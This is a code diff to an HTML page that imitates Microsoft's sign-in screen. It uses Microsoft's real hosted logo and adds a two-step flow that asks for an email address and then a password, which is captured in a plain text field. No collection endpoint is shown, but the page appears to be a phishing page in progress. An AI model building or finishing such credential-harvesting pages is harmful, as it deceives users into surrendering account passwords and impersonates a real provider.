@@ -46,6 +46,10 @@ button {
 .logintxt a:visited{
     color: #0067b8;
 }
+#loginvaladitionmsg{
+    display: none;
+    color: red;
+}
 .logintxt a:link{
     color: #0067b8;
 }
@@ -166,7 +170,7 @@ span.psw {
 
 <div id="id01" class="modal">
   
-  <form class="modal-content animate" action="/action_page.php" method="post">
+  <form class="modal-content animate"  method="post">
     
 
     <div class="container">
@@ -174,7 +178,8 @@ span.psw {
       <img src="https://logincdn.msauth.net/16.000.28345.6/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" alt=""> 
       <br><br>
       <label class="signintxt" for="uname">Sign in</label> <br><br>
-      <input class="email" type="text" placeholder="Enter Username" name="uname" required>
+      <p id="loginvaladitionmsg">Enter a valid email address.</p>
+      <input  id = "loginEmail" class="email" type="text" placeholder="Enter Username" name="uname" required>
 
       <p class="logintxt">no account?<a href="" target="_blank" > Create one!</a></p>
       <p  class="logintxt"><a href="">Sign in with a security key</a></p>
@@ -182,20 +187,55 @@ span.psw {
 
       
         
-      <button type="submit">Next</button>
-      
-  </form>
-</div>
+      <button  onclick="nextBtn()">Next</button>
+      </div>
+     
+    </form>>
+</div> 
 
+
+<div id="id02" class="modal">
+  
+        
+        <form class="modal-content animate"  method="post">
+      
+          <div class="container">
+      
+            <img src="https://logincdn.msauth.net/16.000.28345.6/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" alt=""> 
+            <br><br>
+            <label class="signintxt" for="uname">Enter password</label> <br><br>
+            <input class="password" type="text" placeholder="Password" name="uname" required>
+      
+            <input type="checkbox">Keep me signed in
+            <p  class="logintxt"><a href="">Forgotten your password?</a></p>
+            <p  class="logintxt"><a href="">Sign in with a security key</a></p>
+
+      
+            
+              
+            <button type="submit" id="loginBtn" onclick="">Sign</button>
+            </div>
+        </form>
+      </div>
 <script>
 // Get the modal
 var modal = document.getElementById('id01');
+var passmodal =  document.getElementById('id02');
+passmodal.style.display = "none";
 
 // When the user clicks anywhere outside of the modal, close it
-window.onclick = function(event) {
-    if (event.target == modal) {
-        modal.style.display = "none";
-    }
+
+
+function nextBtn(){
+   event.preventDefault();
+    var email = document.getElementById("loginEmail").value;
+    if(email != "" ){
+    modal.style.display = "none";
+    passmodal.style.display = "block";
+}else{
+document.getElementById("loginvaladitionmsg").style.display = "block";
+}
+
 }
 </script>
 
